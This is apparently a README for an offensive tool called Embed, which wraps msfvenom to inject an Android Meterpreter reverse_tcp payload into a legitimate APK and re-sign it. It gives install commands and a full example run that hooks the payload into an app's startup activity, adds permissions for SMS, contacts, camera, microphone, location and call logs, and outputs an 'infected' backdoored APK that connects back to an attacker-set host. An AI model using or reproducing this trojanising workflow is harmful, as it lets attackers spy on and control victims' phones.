# EMBED v.2.0
This tool creates a payload with metasploit framework and injected into a legitimate APK.

	DISCLAIMER
If the law is violated with it's use, this would be the responsibility of the user who handled it..
Ivam3 is not responsible for the misuse that can be given to everything that this laboratory entails

# REQUIREMENTS.
- Metasploit
- Java
- Keytool
- Apktool
- Jarsigner
- Apksigner
- Aapt

# INSTALLATION.
- Linux OS:
```bash
apt install git -y;
git clone https://github.com/ivam3/embed.git;
chmod +x setup;
bash setup manual
```
- Android OS with Termux:
```bash
apt install wget;
mkdir -p $PREFIX/etc/apt/sources.list.d;
wget https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/ivam3-termux-packages.list -O $PREFIX/etc/apt/sources.list.d/ivam3-termux-packages.list;
apt update && apt upgrade -y;
apt install embed -y
```

# USAGE
### [Usage]─➤ embed.rb [target.apk] [msfvenom options]
- Embed v3+ come with 3 options to use a keystore signature for sign your apk files :
{3} To create your own keystore.
{2} Using your own keystore; if you have one or if you was created it before in option 3.
{1} Default: Using a keystore with the next parameters :
```
Enter keystore password: android
Re-enter new password: android
What is your first and last name?
  [Unknown]:  Android Debugging
What is the name of your organizational unit?
  [Unknown]:  Android
What is the name of your organization?
  [Unknown]:  Android Debugging
What is the name of your City or Locality?
  [Unknown]:  California
What is the name of your State or Province?
  [Unknown]:  San Francisco
What is the two-letter country code for this unit?
  [Unknown]:  CA
Is CN=Android Debugging, OU=Android, O=Android Debugging, L=California, ST=San Francisco, C=CA correct?
  [no]:  yes

Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 10,000 days
for: CN=Android Debugging, OU=Android, O=Android Debugging, L=California, ST=San Francisco, C=CA
[Storing key.jks]
```

# EXAMPLE OF USAGE
```
$ embed PATH/to/legitim.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4546

._____ __  __ ____  _____ ____
| ____|  \/  | __ )| ____|  _ \
|  _| | v3.0 |  _ \|  _| | | | |
| |___| |\/| | |_) | |___| |_| |
|_____|_|  |_|____/|_____|____/
#:::::::: By Ivam3 ::::::::::::#

[?]─➤ Set a keystore signer
 ╰{1}─➤ Default (Android Debug key)
 ╰{2}─➤ Using your own key
 ╰{3}─➤ Create a new key
 ╰────➤ 1
[*]─➤ Generating msfvenom payload..
[*]─➤ Signing payload..
[*]─➤ Decompiling orignal APK..
[*]─➤ Ignoring the resource decompilation..
[*]─➤ Decompiling payload APK..
[*]─➤ Locating onCreate() hook..
[*]─➤ Copying payload files..
[*]─➤ Loading original/smali_classes3/mx/mxlpvplayer/activities/SplashActivity.smali and injecting payload..
[*]─➤ Poisoning the manifest with meterpreter permissions..
[+]─➤ Adding android.permission.CHANGE_WIFI_STATE
[+]─➤ Adding android.permission.ACCESS_COARSE_LOCATION
[+]─➤ Adding android.permission.ACCESS_FINE_LOCATION
[+]─➤ Adding android.permission.READ_PHONE_STATE
[+]─➤ Adding android.permission.SEND_SMS
[+]─➤ Adding android.permission.RECEIVE_SMS
[+]─➤ Adding android.permission.RECORD_AUDIO
[+]─➤ Adding android.permission.CALL_PHONE
[+]─➤ Adding android.permission.READ_CONTACTS
[+]─➤ Adding android.permission.WRITE_CONTACTS
[+]─➤ Adding android.permission.WRITE_SETTINGS
[+]─➤ Adding android.permission.CAMERA
[+]─➤ Adding android.permission.READ_SMS
[+]─➤ Adding android.permission.SET_WALLPAPER
[+]─➤ Adding android.permission.READ_CALL_LOG
[+]─➤ Adding android.permission.WRITE_CALL_LOG
[+]─➤ Adding android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
[*]─➤ Rebuilding /PATH/to/legitim.apk
      with meterpreter injection as data/data/com_backdoored.apk..
[*]─➤ Signing data/data/com_backdoored.apk ..
[*]─➤ Aligning data/data/com_backdoored.apk ..
[+]─➤ Infected file legitim.apk_final ready.
```

### License

GNU

##### Follow me on [Socials Network](https://wlo.link/@Ivam3)
